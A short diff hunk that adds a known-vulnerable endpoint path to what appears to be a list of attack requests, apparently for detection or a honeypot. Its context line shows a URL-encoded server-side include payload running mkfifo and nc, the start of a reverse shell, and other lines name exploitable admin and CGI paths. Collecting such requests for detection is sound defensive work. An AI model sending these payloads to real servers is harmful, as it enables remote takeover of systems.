@@ -1159,3 +1159,4 @@ GET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20
 t3 12.2.1
 POST /tmUnblock.cgi
 GET /CFIDE/administrator/
+POST /spywall/timeConfig.php
